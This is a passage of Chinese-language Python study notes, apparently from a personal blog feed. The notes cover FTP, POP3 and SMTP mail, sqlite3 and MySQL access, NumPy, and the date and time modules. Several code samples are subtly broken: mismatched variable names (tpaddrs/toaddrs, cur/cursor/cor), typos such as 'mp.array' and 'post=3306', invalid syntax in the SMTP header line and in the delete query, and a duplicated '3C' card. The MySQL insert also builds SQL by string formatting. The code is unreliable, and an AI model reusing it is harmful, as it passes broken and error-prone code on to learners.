string">'ftp.python.org'</span><span class="token punctuation">)</span>ftps<span class="token punctuation">.</span>login<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#匿名登录安全控制通道</span>ftps<span class="token punctuation">.</span>prot_p<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#安全数据连接（加密传输）</span>ftps<span class="token punctuation">.</span>retrlines<span class="token punctuation">(</span><span class="token string">'LIST'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#罗列目录清单</span>ftps<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#退出</span></code></pre><h1 id="五、基于POPLIB和SMTPLIB的网络编程"><a href="#五、基于POPLIB和SMTPLIB的网络编程" class="headerlink" title="五、基于POPLIB和SMTPLIB的网络编程"></a>五、基于POPLIB和SMTPLIB的网络编程</h1><ul><li>poplib模块提供了对POP3协议的支持</li><li>smtplib模块提供了对SMTP协议的支持</li><li>使用poplib和smtplib，可以实现接收和发送邮件的功能</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#POP3示例</span><span class="token keyword">import</span> getpass<span class="token punctuation">,</span>poplibhost<span class="token operator">=</span><span class="token string">'YourPop3Host'</span>    <span class="token comment" spellcheck="true">#POP3服务器的主机名或IP地址，运行时需修改为对应的值</span>port<span class="token operator">=</span><span class="token number">110</span>    <span class="token comment" spellcheck="true">#POP3服务器的端口号，默认为110，运行时需修改为对应的值</span>pop3<span class="token operator">=</span>poplib<span class="token punctuation">.</span>POP3<span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token operator">=</span>port<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建POP3对象</span>pop3<span class="token punctuation">.</span>user<span class="token punctuation">(</span>getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户名</span>pop3<span class="token punctuation">.</span>pass_<span class="token punctuation">(</span>getpass<span class="token punctuation">.</span>getpass<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码</span>numMessages<span class="token operator">=</span>len<span class="token punctuation">(</span>pop3<span class="token punctuation">.</span>list<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#邮件数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>numMessages<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#接收邮件</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> pop3<span class="token punctuation">.</span>retr<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#SMTP示例</span><span class="token keyword">import</span> smtplib<span class="token keyword">def</span> <span class="token function">prompt</span><span class="token punctuation">(</span>prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> input<span class="token punctuation">(</span>prompt<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>fromaddr<span class="token operator">=</span>prompt<span class="token punctuation">(</span><span class="token string">"From: "</span><span class="token punctuation">)</span>tpaddrs<span class="token operator">=</span>prompt<span class="token punctuation">(</span><span class="token string">"To: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入信息，^D(Unix) or ^Z(Windows)结束输入："</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#添加From: 和 To: 头信息</span>msg<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"From: %s\r\nTo: %s\r\n\r\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>fromaddr <span class="token string">"."</span> join<span class="token punctuation">(</span>toaddrs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        line<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> line<span class="token punctuation">:</span>        <span class="token keyword">break</span>    msg<span class="token operator">=</span>msg<span class="token operator">+</span>line<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"信息长度为："</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token operator">=</span>smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>set_debuglevel<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span>toaddrs<span class="token punctuation">,</span>msg<span class="token punctuation">)</span>server<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/11/2021 11:51:54 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python数据库访问</title>
      <link href="2021/03/10/python-shu-ju-ku-fang-wen/"/>
      <url>2021/03/10/python-shu-ju-ku-fang-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Python数据库访问模块"><a href="#一、Python数据库访问模块" class="headerlink" title="一、Python数据库访问模块"></a>一、Python数据库访问模块</h1><p><strong>通用数据库访问模块：ODBC&amp;JDBC</strong></p><ul><li>ODBC Interface: PythonWin附带</li><li>pyodbc: 开源，完整实现DB-API2.0</li><li>mxPDBS: 付费，部分实现DB-API2.0</li><li>zxJDBC: Jython2.1+包含</li></ul><p><strong>专用数据库访问模块</strong></p><ul><li>MySQL: MySQL-python(MySQLdb，过时)、mysqlclient、pymysql、sqlalchemy(ORM框架，Web编程）</li><li>PostgreSQL: PyGreSQL</li><li>Oracle: DCOracle2</li><li>SQLServer: pymssql<h1 id="二、SQLite数据库"><a href="#二、SQLite数据库" class="headerlink" title="二、SQLite数据库"></a>二、SQLite数据库</h1>SQLite是一款开源的轻型的数据库</li><li>简单、资源低占用</li><li>实现了大部分SQL-92标准</li><li>无类型检查，适用于脚本语言</li><li>整个SQLite数据库存于一个文件<br>  SQLite支持的数据类型包括：NULL、INTEGER、REAL、TEXT和BLOB，分别对应Python的数据类型：None、int、float、str和bytes</li></ul><p><strong>sqlite3模块</strong><br>C实现，提供访问和操作SQLite数据库的各种功能<br>sqlite3模块：</p><ul><li>sqlite3.version    #常量</li><li>sqlite3.connect(database)    #函数，返回Connect对象</li><li>sqlite3.Connect    #数据库连接对象</li><li>sqlite3.Cursor    #游标对象</li><li>sqlite3.Row    #行对象<h1 id="三、连接和操作SQLITE数据库"><a href="#三、连接和操作SQLITE数据库" class="headerlink" title="三、连接和操作SQLITE数据库"></a>三、连接和操作SQLITE数据库</h1>Python访问数据库的典型步骤：</li></ul><ol><li>导入相应的数据库模块</li><li>建立数据库连接，返回Connection对象</li></ol><pre class=" language-python"><code class="language-python">con<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>r<span class="token string">"c:\python\sales.db"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r是对字符'\'转义</span>con<span class="token operator">=</span>pymsql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'abc'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token string">'test1'</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#服务器端数据库的连接</span></code></pre><ol start="3"><li>创建游标对象cur</li><li>使用Cursor对象得到execute执行SQL命令返回结果<br>（建议直接使用Connection对象的execute方法，返回Cursor对象）</li></ol><pre class=" language-python"><code class="language-python">cur<span class="token operator">=</span>con<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select id,name from region"</span><span class="token punctuation">)</span>regions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"021"</span><span class="token punctuation">,</span><span class="token string">"上海"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"022"</span><span class="token punctuation">,</span><span class="token string">"天津"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"023"</span><span class="token punctuation">,</span><span class="token string">"重庆"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"024"</span><span class="token punctuation">,</span><span class="token string">"沈阳"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>con<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span><span class="token string">"insert into region(id,name) values(?,?)"</span><span class="token punctuation">,</span>regions<span class="token punctuation">)</span></code></pre><ol start="5"><li>获取游标的查询结果集Cursor.fetch()</li></ol><pre class=" language-python"><code class="language-python">cor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回结果集的下一行(Row对象)，或None</span>cor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回结果集的剩余行(Row对象列表)，或空表</span>cor<span class="token punctuation">.</span>fetchmany<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回结果集的多行(Row对象列表)，或空表</span>cor<span class="token punctuation">.</span>rowcount    <span class="token comment" spellcheck="true">#执行sql命令实际影响的行数</span></code></pre><p>Row对象r为一行查询结果序列，支持以下访问</p><pre class=" language-python"><code class="language-python">r<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#按索引访问，返回第i列数据</span>r<span class="token punctuation">[</span>colname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#按列名访问，返回colname列数据</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回列数</span>r<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回列名列表</span><span class="token comment" spellcheck="true">#应用</span><span class="token keyword">for</span> r <span class="token keyword">in</span> con<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select id,name from region"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>r<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><ol start="6"><li>数据库的提交和回滚</li></ol><pre class=" language-python"><code class="language-python">con<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#提交</span>con<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#回滚</span></code></pre><ol start="7"><li>关闭Cursor对象和Connection对象</li></ol><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#cur.close()    #关闭游标</span><span class="token comment" spellcheck="true">#con.close()    #关闭数据库</span>r<span class="token operator">=</span>con<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"delete from region where id=?"</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">"024"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除了'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>rowcount<span class="token punctuation">,</span><span class="token string">'行记录'</span><span class="token punctuation">)</span>con<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#提交</span>con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭数据库</span></code></pre><h1 id="四、PYTHON使用MYSQL数据库"><a href="#四、PYTHON使用MYSQL数据库" class="headerlink" title="四、PYTHON使用MYSQL数据库"></a>四、PYTHON使用MYSQL数据库</h1><p>要使用Python操作MySQL，首先需要安装MySQL-Python的包，可用pip方式安装：pip install MySQLClient。<br>启动MySQL服务器：以管理员身份启动cmd，输入命令：net start mysql<br>Python中使用MySQL: import MySQLdb<br>创建Connection</p><pre class=" language-python"><code class="language-python">con<span class="token operator">=</span>MySQLdb<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'abc'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token string">'test1'</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>Connection支持的方法：</p><ul><li>cursor()    #创建并返回游标</li><li>commit()    #提交当前事务</li><li>rollback()    #回滚当前事务</li><li>close()    #关闭Connection</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#MySQL示例</span>conn<span class="token operator">=</span>MySQLdb<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>post<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'abc'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token string">'test1'</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""create table if not EXISTS user(userid int(11) PRIMARY KEY,username VARCHAR(20))"""</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into user(userid,username) values('%d','%s')"</span><span class="token operator">%</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'name'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select * from user'</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'update user set username="name91" where userid=9'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cursor<span class="token punctuation">.</span>rowcount<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/10/2021 11:31:38 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数值、日期和时间处理</title>
      <link href="2021/03/10/shu-zhi-ri-qi-he-shi-jian-chu-li/"/>
      <url>2021/03/10/shu-zhi-ri-qi-he-shi-jian-chu-li/</url>
      
        <content type="html"><![CDATA[<h1 id="1、相关模块概述"><a href="#1、相关模块概述" class="headerlink" title="1、相关模块概述"></a>1、相关模块概述</h1><h2 id="1-数值处理的相关模块"><a href="#1-数值处理的相关模块" class="headerlink" title="1.数值处理的相关模块"></a>1.数值处理的相关模块</h2><h3 id="（1）Python标准款中包括下列数值处理相关模块"><a href="#（1）Python标准款中包括下列数值处理相关模块" class="headerlink" title="（1）Python标准款中包括下列数值处理相关模块"></a>（1）Python标准款中包括下列数值处理相关模块</h3><ul><li>numbers模块：数值抽象类。包含类Complex、Real、Rational、Integral。</li><li>math模块：数学函数</li><li>cmath模块：复数运算数学函数</li><li>decimal模块：高精度数值运算</li><li>fractions模块：分数运算模块</li><li>random模块：随机数模块<br><img src="https://www.hualigs.cn/image/6048d9b722e3a.jpg" alt=""></li></ul><h3 id="（2）数值运算模块Numpy。"><a href="#（2）数值运算模块Numpy。" class="headerlink" title="（2）数值运算模块Numpy。"></a>（2）数值运算模块Numpy。</h3><p>Numpy模块主要提供数组和矩阵处理功能，还包括高级功能，如傅里叶变换等。</p><h3 id="（3）科学计算模块SciPy。"><a href="#（3）科学计算模块SciPy。" class="headerlink" title="（3）科学计算模块SciPy。"></a>（3）科学计算模块SciPy。</h3><p>SciPy模块包括统计、优化、整合、线性代数、傅里叶变换、信号和图像处理、常微分方程求解器等功能。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#random应用</span><span class="token comment" spellcheck="true">#随机生成扑克牌的四手牌（4个人的牌局，每手牌13张）</span><span class="token keyword">import</span> random<span class="token comment" spellcheck="true">#一副牌：Club（梅花）、Diamond（方块）、Heart（红桃）、Spade（黑桃）</span>cards<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2C'</span><span class="token punctuation">,</span><span class="token string">'3C'</span><span class="token punctuation">,</span><span class="token string">'4C'</span><span class="token punctuation">,</span><span class="token string">'5C'</span><span class="token punctuation">,</span><span class="token string">'6C'</span><span class="token punctuation">,</span><span class="token string">'7C'</span><span class="token punctuation">,</span><span class="token string">'8C'</span><span class="token punctuation">,</span><span class="token string">'9C'</span><span class="token punctuation">,</span><span class="token string">'10C'</span><span class="token punctuation">,</span><span class="token string">'JC'</span><span class="token punctuation">,</span><span class="token string">'QC'</span><span class="token punctuation">,</span><span class="token string">'KC'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">,</span>       <span class="token string">'2D'</span><span class="token punctuation">,</span><span class="token string">'3C'</span><span class="token punctuation">,</span><span class="token string">'4D'</span><span class="token punctuation">,</span><span class="token string">'5D'</span><span class="token punctuation">,</span><span class="token string">'6D'</span><span class="token punctuation">,</span><span class="token string">'7D'</span><span class="token punctuation">,</span><span class="token string">'8D'</span><span class="token punctuation">,</span><span class="token string">'9D'</span><span class="token punctuation">,</span><span class="token string">'10D'</span><span class="token punctuation">,</span><span class="token string">'JD'</span><span class="token punctuation">,</span><span class="token string">'QD'</span><span class="token punctuation">,</span><span class="token string">'KD'</span><span class="token punctuation">,</span><span class="token string">'AD'</span><span class="token punctuation">,</span>       <span class="token string">'2H'</span><span class="token punctuation">,</span><span class="token string">'3H'</span><span class="token punctuation">,</span><span class="token string">'4H'</span><span class="token punctuation">,</span><span class="token string">'5H'</span><span class="token punctuation">,</span><span class="token string">'6H'</span><span class="token punctuation">,</span><span class="token string">'7H'</span><span class="token punctuation">,</span><span class="token string">'8H'</span><span class="token punctuation">,</span><span class="token string">'9H'</span><span class="token punctuation">,</span><span class="token string">'10H'</span><span class="token punctuation">,</span><span class="token string">'JH'</span><span class="token punctuation">,</span><span class="token string">'QH'</span><span class="token punctuation">,</span><span class="token string">'KH'</span><span class="token punctuation">,</span><span class="token string">'AH'</span><span class="token punctuation">,</span>       <span class="token string">'2S'</span><span class="token punctuation">,</span><span class="token string">'3S'</span><span class="token punctuation">,</span><span class="token string">'4S'</span><span class="token punctuation">,</span><span class="token string">'5S'</span><span class="token punctuation">,</span><span class="token string">'6S'</span><span class="token punctuation">,</span><span class="token string">'7S'</span><span class="token punctuation">,</span><span class="token string">'8S'</span><span class="token punctuation">,</span><span class="token string">'9S'</span><span class="token punctuation">,</span><span class="token string">'10S'</span><span class="token punctuation">,</span><span class="token string">'JS'</span><span class="token punctuation">,</span><span class="token string">'QS'</span><span class="token punctuation">,</span><span class="token string">'KS'</span><span class="token punctuation">,</span><span class="token string">'AS'</span><span class="token punctuation">]</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>cards<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#混排，洗牌</span>deck1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>deck2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>deck3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>deck4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#初始化四手牌</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#发牌</span>    deck1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    deck2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    deck3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    deck4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck4<span class="token punctuation">)</span>       </code></pre><h2 id="2-数值运算模块NUMPY"><a href="#2-数值运算模块NUMPY" class="headerlink" title="2.数值运算模块NUMPY"></a>2.数值运算模块NUMPY</h2><h3 id="（1）创建数组"><a href="#（1）创建数组" class="headerlink" title="（1）创建数组"></a>（1）创建数组</h3><p>（1）通过array函数，把序列对象参数转化为数组</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npa<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>b<span class="token operator">=</span>mp<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>（2）通过arrange、linspace和logspace函数创建数组</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npa<span class="token operator">=</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#从start到stop，2为步长</span>b<span class="token operator">=</span>np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#从0到2pi，创建长度为10的等差数列数组</span>c<span class="token operator">=</span>np<span class="token punctuation">.</span>logspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#等比数列</span></code></pre><p><img src="https://www.hualigs.cn/image/6048d9b14717c.jpg" alt=""></p><h3 id="（2）数组应用"><a href="#（2）数组应用" class="headerlink" title="（2）数组应用"></a>（2）数组应用</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#绘制正弦余弦函数图形</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt <span class="token keyword">import</span> mathx<span class="token operator">=</span>np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>y1<span class="token operator">=</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>y2<span class="token operator">=</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>x<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/6048d9b12e910.jpg" alt="">                                       </p><h1 id="2、日期和时间处理概述"><a href="#2、日期和时间处理概述" class="headerlink" title="2、日期和时间处理概述"></a>2、日期和时间处理概述</h1><ul><li><p>datetime模块：日期和时间类</p></li><li><p>calendar模块：日历函数和类</p></li><li><p>time模块：时间函数</p><h2 id="1-DATETIME模块"><a href="#1-DATETIME模块" class="headerlink" title="1.DATETIME模块"></a>1.DATETIME模块</h2></li><li><p>两个常量：datetime.MINTEAR(1)和datetime.MAXYEAR(9999)</p></li><li><p>获取当前日期时间<br>  通过datetime模块的date.today()函数可以返回表示当前日期的date对象，通过其实例对象方法，可以获取其年、月、日等信息</p><p>  通过datime模块的datetime.now()函数可以返回表示当前日期时间的datetime对象，通过其实例对象方法，可以获取其年、月、日、时、分、秒等信息</p><h2 id="2-time模块"><a href="#2-time模块" class="headerlink" title="2.time模块"></a>2.time模块</h2></li><li><p>time模块中的strftime()函数将struct_time对象格式化为字符串</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#日期时间格式化为字符串示例</span><span class="token keyword">from</span> time <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">print</span><span class="token punctuation">(</span>strftime<span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y{y}%m{m}%d{d}%H{h}%M{f}%S{s}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token string">'年'</span><span class="token punctuation">,</span>m<span class="token operator">=</span><span class="token string">'月'</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token string">'日'</span><span class="token punctuation">,</span>h<span class="token operator">=</span><span class="token string">'时'</span><span class="token punctuation">,</span>f<span class="token operator">=</span><span class="token string">'分'</span><span class="token punctuation">,</span>s<span class="token operator">=</span><span class="token string">'秒'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>time模块中的strptime()函数将时间字符串解析为struct_time对象</p></li></ul><h1 id="3、字符串和文本处理的相关模块"><a href="#3、字符串和文本处理的相关模块" class="headerlink" 